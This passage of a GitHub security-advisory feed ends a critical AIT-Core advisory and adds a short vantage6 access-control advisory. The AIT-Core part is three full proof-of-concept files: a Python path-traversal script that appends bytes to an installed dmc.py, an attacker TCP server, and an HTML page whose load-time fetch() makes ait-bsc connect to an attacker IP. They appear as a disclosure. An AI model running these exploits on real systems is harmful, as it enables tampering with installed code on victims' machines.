HOME = os.path.expanduser("~")
TARGET_DIR = "/home/elias/ait-venv/lib/python3.10/site-packages/ait/core/"
TARGET_FILE = "dmc.py"
TARGET_PATH = os.path.join(TARGET_DIR, TARGET_FILE)

# Payload to be sent in the UDP datagram
PAYLOAD = b"ATTACK_PAYLOAD_UDP_TIMED_12345"


def wait_for_first_header_byte_zero():
    """
    Wait until the low byte of the current UNIX seconds is 0.

    PCapPacketHeader.pack() writes ts_sec first, and on little-endian systems
    the first byte in the file is ts_sec &amp; 0xFF. We wait for ts_sec % 256 == 0
    and for the fractional part of the second to be small.
    """
    print("[*] Waiting for ts_sec &amp; 0xFF == 0 (may take up to ~4m16s)...")
    while True:
        now = time.time()
        ts_sec = int(now)
        # Condition: low byte zero and we are in the first 200ms of this second
        if (ts_sec &amp; 0xFF) == 0 and (now - ts_sec) &lt; 0.2:
            print(f"[+] Condition met: ts_sec={ts_sec}, low byte=0x00")
            return
        time.sleep(0.01)


def create_udp_handler():
    """
    Use BSC REST API to create a UDP handler that binds on UDP_PORT and
    logs to TARGET_PATH, which is outside /tmp via the 'path' parameter.
    """
    data = {
        "loc": "",                  # bind on all interfaces
        "port": str(UDP_PORT),
        "conn_type": CONN_TYPE,
        "path": TARGET_DIR,         # ABSOLUTE path outside /tmp
        "file_name_pattern": TARGET_FILE,
    }
    url = f"{BSC_BASE_URL}/{HANDLER_NAME}/start"
    print(f"[+] Creating UDP handler via POST {url}")
    resp = requests.post(url, data=data)
    print(f"[+] Handler creation HTTP status: {resp.status_code}")
    if not (200 &lt;= resp.status_code &lt; 300):
        raise SystemExit(f"Handler creation failed: {resp.status_code} {resp.text!r}")


def send_udp_payload_timed():
    """
    Wait for the desired timestamp condition, then send the UDP payload
    to the handler's bound UDP port.
    """
    wait_for_first_header_byte_zero()
    print(f"[+] Sending timed UDP payload to 127.0.0.1:{UDP_PORT}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(PAYLOAD, ("127.0.0.1", UDP_PORT))
    finally:
        sock.close()
    # Give ait-bsc a moment to recv and write
    time.sleep(0.5)


def stop_udp_handler():
    """
    Stop the handler so the script can be rerun without restarting ait-bsc.
    """
    url = f"{BSC_BASE_URL}/{HANDLER_NAME}/stop"
    try:
        resp = requests.delete(url, timeout=2)
        print(f"[+] DELETE {url} -&gt; HTTP {resp.status_code}")
    except Exception as e:
        print(f"[!] Failed to DELETE handler: {e!r}")


def show_result():
    """
    Display hex+ASCII view of the first bytes of TARGET_PATH.
    """
    if not os.path.exists(TARGET_PATH):
        print(f"[!] Target file does not exist: {TARGET_PATH}")
        print("    ait-bsc did not create/write the file \u2014 check config and that ait-bsc is running.")
        return

    print(f"[+] Target file was created or appended by ait-bsc: {TARGET_PATH}")
    data = open(TARGET_PATH, "rb").read()
    print(f"[+] Target file size: {len(data)} bytes")

    def chunked(seq, size):
        for i in range(0, len(seq), size):
            yield i, seq[i : i + size]

    print("[+] First bytes of file (hex + ASCII):")
    for offset, chunk in chunked(data, 16):
        hex_bytes = " ".join(f"{b:02x}" for b in chunk)
        ascii_bytes = "".join(chr(b) if 32 &lt;= b &lt; 127 else "." for b in chunk)
        print(f"{offset:08x}  {hex_bytes:&lt;47}  |{ascii_bytes}|")
        if offset &gt;= 96:
            break

    if PAYLOAD in data:
        print("[+] CONFIRMED: payload bytes are present in the file.")
    else:
        print("[!] Payload bytes not found (something went wrong).")


def main():
    print("[*] AIT-Core BSC path traversal &amp; arbitrary file append PoC (UDP, timed header)")
    print(f"[*] BSC base URL : {BSC_BASE_URL}")
    print(f"[*] UDP port     : {UDP_PORT}")
    print(f"[*] TARGET_DIR   : {TARGET_DIR}")
    print(f"[*] TARGET_FILE  : {TARGET_FILE}")
    print(f"[*] FULL PATH    : {TARGET_PATH}")
    print()

    # We deliberately do NOT create TARGET_DIR or TARGET_PATH here.
    # ait-bsc will create the directory and file when it opens the log path.
    create_udp_handler()
    send_udp_payload_timed()
    show_result()
    stop_udp_handler()

    print()
    print("[*] If you see your PAYLOAD bytes in TARGET_PATH (which is not under /tmp),")
    print("[*] then BSC has written outside its configured root_log_directory via REST 'path' using UDP.")
    print("[*] The script also timed the send so the first packet header byte (ts_sec low byte) is likely 0x00.")


if __name__ == "__main__":
    main()
</code></pre>
<h3 id="42-attacker_tcppy">4.2 <code>attacker_tcp.py</code></h3>
<pre><code class="language-python">#!/usr/bin/env python3
import socket

HOST = "0.0.0.0"    # attacker host interface
PORT = 9001         # must match 'port' you send to ait-bsc
PAYLOAD = b"ATTACK_PAYLOAD_FROM_ATTACKER_12345\n"

def main():
    print(f"[*] Attacker TCP server listening on {HOST}:{PORT}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((HOST, PORT))
        srv.listen(1)

        print("[*] Waiting for connection from ait-bsc...")
        bsc_sock, bsc_addr = srv.accept()
        print(f"[+] Got connection from ait-bsc at {bsc_addr}")

        with bsc_sock:
            print("[+] Sending payload to ait-bsc...")
            bsc_sock.sendall(PAYLOAD)
            print("[+] Payload sent, closing connection")

    print("[*] Done.")

if __name__ == "__main__":
    main()
</code></pre>
<h3 id="43-test1html">4.3 <code>test1.html</code></h3>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;meta charset="utf-8"&gt;
  &lt;title&gt;AIT-BSC Path Traversal PoC (Browser + TCP)&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;script&gt;
(function () {
  // AIT-BSC REST API on the victim
  const BSC_URL      = "http://127.0.0.1:8080";
  const HANDLER_NAME = "traversal-tcp-from-browser";

  // Attacker TCP server (remote)
  const ATTACKER_HOST = "192.168.1.184";  // change to real host/IP
  const ATTACKER_PORT = 9001;                    // must match Python server

  // Target file on the victim (outside /tmp)
  const TARGET_DIR  = "/home/elias/ait-venv/lib/python3.10/site-packages/ait/core/";
  const TARGET_FILE = "dmc.py";

  function startHandler() {
    // Tell ait-bsc to:
    //  - connect via TCP to ATTACKER_HOST:ATTACKER_PORT
    //  - log to TARGET_DIR/TARGET_FILE (escape /tmp via 'path')
    const params = new URLSearchParams();
    params.set("loc", ATTACKER_HOST);
    params.set("port", String(ATTACKER_PORT));
    params.set("conn_type", "tcp");
    params.set("path", TARGET_DIR);
    params.set("file_name_pattern", TARGET_FILE);

    fetch(`${BSC_URL}/${HANDLER_NAME}/start`, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: params.toString(),
      mode: "no-cors"  // we don't care about reading the response
    }).catch(() =&gt; {});
  }

  // On page load, just start the handler. The attacker TCP server
  // will send the payload as soon as ait-bsc connects.
  window.addEventListener("load", startHandler);
})();
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/NASA-AMMOS/AIT-Core/security/advisories/GHSA-p462-prxw-mjx4">https://github.com/NASA-AMMOS/AIT-Core/security/advisories/GHSA-p462-prxw-mjx4</a></li>
<li><a href="https://github.com/NASA-AMMOS/AIT-Core/releases/tag/2.6.1">https://github.com/NASA-AMMOS/AIT-Core/releases/tag/2.6.1</a></li>
<li><a href="https://github.com/NASA-AMMOS/AIT-Core/releases/tag/3.1.1">https://github.com/NASA-AMMOS/AIT-Core/releases/tag/3.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-p462-prxw-mjx4">https://github.com/advisories/GHSA-p462-prxw-mjx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p462-prxw-mjx4</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-05T18:11:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vantage6] Improper Access Control in vantage6 node]]></title>
        <id>https://github.com/advisories/GHSA-x9f6-9rvm-mmrg</id>
        <link href="https://github.com/advisories/GHSA-x9f6-9rvm-mmrg"/>
        <updated>2026-06-05T16:45:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Malicious algorithms can potentially access other algorithms input and output files.</p>
<h3 id="patches">Patches</h3>
<p>Todo</p>
<h3 id="workarounds">Workarounds</h3>
<p>Verify and restrict the algorithm containers that are allowed to run on your node. See <a href="https://docs.vantage6.ai/usage/running-the-node/security">here</a> on how to do this.</p>
<h3 id="references">References</h3>
<p><a href="https://docs.vantage6.ai/usage/running-the-node/security">https://docs.vantage6.ai/usage/running-the-node/security</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Email us at <a href="mailto:vantage6@iknl.nl">vantage6@iknl.nl</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/vantage6/vantage6/security/advisories/GHSA-x9f6-9rvm-mmrg">https://github.com/vantage6/vantage6/security/advisories/GHSA-x9f6-9rvm-mmrg</a></li>
<li><a href="https://github.com/vantage6/vantage6/issues/1932">https://github.com/vantage6/vantage6/issues/1932</a></li>
<li><a href="https://github.com/advisories/GHSA-x9f6-9rvm-mmrg">https://github.com/advisories/GHSA-x9f6-9rvm-mmrg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x9f6-9rvm-mmrg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-05T16:45:45.000Z</published>
    </entry>
</feed>